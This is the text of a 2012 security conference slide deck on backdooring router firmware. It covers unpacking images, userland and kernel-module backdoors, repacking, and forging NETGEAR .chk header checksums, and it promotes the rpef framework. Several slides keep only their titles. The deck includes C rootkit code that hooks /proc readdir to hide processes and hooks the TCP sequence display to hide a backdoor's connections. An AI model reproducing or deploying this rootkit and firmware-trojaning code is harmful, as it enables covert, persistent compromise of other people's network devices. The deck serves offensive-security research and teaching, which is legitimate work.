Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Getting unsquashfs
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Getting unsquashfs
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
...and success!
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Deploying the Payload
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Payload Vectors
▪So we have a minimalistic Linux system...
▪Userland is dirtier, quicker, more portable
▪Kernel-land is stealthier, more development 
considerations, less portable
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Infection via Userland
▪Simple C backdoor code, drop on filesystem
▪Single binary is executable across nearly all 
target systems
▪File is visible, process is visible... who cares?
▪Connections are visible... more of an issue.
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Dropping the Binary
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Infection via Kernel-Land
▪Three possible methods
▫ Infection via LKM
▫ Infection via /dev/kmem
▫ Static kernel patching
▪Bug in code would DoS the entire network
▪Must be compiled against target kernel tree
▪Files, processes, connections are hidden
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Infection via LKM
▪Linux Kernel Module
▪Basic rootkit techniques from old Phrack 
articles are still relevant
▫ plaguez - Weakening the Linux Kernel (Issue #52)
▫ palmers – Advances in Kernel hacking (Issue #58)
▫ sd, devik - Linux on-the-fly kernel patching without 
LKM (Issue #58)
▫ tress - Infecting loadable kernel modules (Issue #61)
▪As well as older rootkit code (like Adore)
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Infection via LKM
▪Init and exit functions
▪Hide processes -> Hook /proc readdir()
▪Hide files / directories -> Hook dir readdir()
▪Hide connections -> Hook /proc/net/tcp, udp
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
LKM Structure for 2.4
#include 
#include 
int init_module ( void ) {
    // Executed upon LKM load
    // We'll call out to hook various functions here
    return 0;
}
void cleanup_module ( void ) {
    // Executed upon LKM unload
    // We'll uninstall any hooks and restore original function pointers here
}
MODULE_LICENSE("GPL");
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
LKM Structure for 2.6
#include 
#include 
static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void ) {
    // Executed upon LKM load
    // We'll call out to hook various functions here
    return 0;
}
static void __exit mischief_managed ( void ) {
    // Executed upon LKM unload
    // We'll uninstall any hooks and restore original function pointers here
}
module_init(i_solemnly_swear_that_i_am_up_to_no_good);
module_exit(mischief_managed);
MODULE_LICENSE("GPL");
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Linux 2.4/2.6 Hiding Processes (and Files)
readdir_t o_proc_readdir;
filldir_t o_proc_filldir;
int n_proc_filldir ( void *__buf, const char *name, int namelen, loff_t offset, u64 
ino, unsigned d_type ) {
    char *endp;
    if ( is_hidden_pid(simple_strtol(name, &endp, 10)) )
        return 0;
    return o_proc_filldir(__buf, name, namelen, offset, ino, d_type);
}
int n_proc_readdir ( struct file *file, void *dirent, filldir_t filldir ) {
    o_proc_filldir = filldir;
    return o_proc_readdir(file, dirent, &n_proc_filldir);
}
void hook_proc () {
    struct file *filep;
    filep = filp_open("/proc", O_RDONLY, 0);
    o_proc_readdir = filep->f_op->readdir;
    filep->f_op->readdir = &n_proc_readdir;
    filp_close(filep, 0);
}
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Linux 2.4 Hiding Connections
Dirty hairball of code, full code in adore-ng:
int n_get_info_tcp ( char *page, char **start, 
off_t pos, int count ) {
    int r = 0, i = 0, n = 0;
    char port[10], *ptr, *it;
[...]
    r = o_get_info_tcp(page, start, pos, count);
[...]
    for ( ; ptr subdir;
    while ( strcmp(pde->name, "tcp") )
        pde = pde->next;
    o_get_info_tcp = pde->get_info;
    pde->get_info = &n_get_info_tcp;
}
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Linux 2.6 Hiding Connections
static int (*o_tcp4_seq_show)(struct seq_file *seq, void *v);
#define TMPSZ 150
static int n_tcp4_seq_show ( struct seq_file *seq, void *v ) {
    int ret;
    char port[12];
    ret = o_tcp4_seq_show(seq, v);
    sprintf(port, ":%04X", to_hide_port);
    if ( srnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) ) {
        seq->count -= TMPSZ;
        break;
    }
    return ret;
}
void hook_tcp () {
    struct file *filep;
    struct tcp_seq_afinfo *afinfo;
    filep = filp_open("/proc/net/tcp", O_RDONLY, 0);
    afinfo = PDE(filep->f_dentry->d_inode)->data;
    o_tcp4_seq_show = afinfo->seq_ops.show;
    afinfo->seq_ops.show = &n_tcp4_seq_show;
    filp_close(filep, 0);
}
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Repacking the Image
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Repacking the Image
▪Rebuild the unpacked filesystem
▪Append extracted / generated parts 
together again
▪Pad sections to defined length, if necessary
▪Don't worry about metadata yet, we'll take 
care of that next
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Building the Filesystem
▪Build the filesystem with the appropriate 
utility and version
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Padding the Image
Placeholder for header
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Updating the Image Metadata
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
NETGEAR .chk Header
0
1
2
3
4
5
6
7
Magic Number ('*#$^')
Header Length
Reserved
Kernel Checksum
Rootfs Checksum
Kernel Length
Rootfs Length
Image Checksum
Header Checksum
Board ID (< 64 bytes)
Board ID (cont.)
Board ID (cont.)
Board ID (cont.)
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
NETGEAR .chk Header
Variable
Value
Magic Value
*#$^
Header Length
0x31 = 58 bytes
Reserved
02 01 00 02 1a 33 00 3b
Kernel Checksum
0a b0 f2 51
Rootfs Checksum
00 00 00 00
Kernel Length
0x277000 = 2,584,576 bytes
Rootfs Length
0
Image Checksum
0a b0 f2 51
Header Checksum
0f 67 0a dd
Board ID
U12H139T00_NETGEAR
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Generating a .chk Header
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
rpef: The Router Post-
Exploitation Framework
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
rpef
▪Abstracts and expedites the process of 
backdooring router firmware images
▪http://redmine.poppopret.org/projects/rpef
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Future Work
▪More supported routers / modules
▪More / better payloads (VPN/SOCKS, modify 
traffic, port knocking?)
▪Arbitrary size payloads?
▪Multiple payloads?
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Future Work
▪Static kernel patching?
▪Reverse engineering work required to get 
past some roadblocks
▪Port all binary utilities to Python for OS 
agnosticism
▪Integration with other frameworks?
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Thank You
▪Dan Rosenberg (vulnfactory.org)
▪Ian Latter (midnightcode.org)
▪OpenWRT community (openwrt.org)
Copyright © 2012 Virtual Security Research, LLC.
All Rights Reserved.
Questions?